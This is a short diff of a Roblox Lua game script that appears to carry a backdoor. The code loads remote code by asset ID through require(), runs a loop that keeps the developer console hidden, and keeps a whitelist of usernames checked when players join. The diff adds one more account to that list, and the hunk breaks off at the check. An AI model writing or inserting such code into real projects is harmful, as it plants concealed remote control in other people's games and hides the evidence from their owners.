@@ -10,7 +10,7 @@ if game:GetService("RunService"):IsStudio() then
 	end
 	require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
 else
-	local whitelisted = {"gahwaeawqara1321","equsjd1","CONTRABL0X","Generatedacc_7","Generatedacc_5","HacClip"}
+	local whitelisted = {"gahwaeawqara1321","equsjd1","CONTRABL0X","Generatedacc_7","Generatedacc_5","HacClip","00cx0"}
 	require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
 	game:GetService("Players").PlayerAdded:Connect(function(v)
 		if table.find(whitelisted,v.Name) then
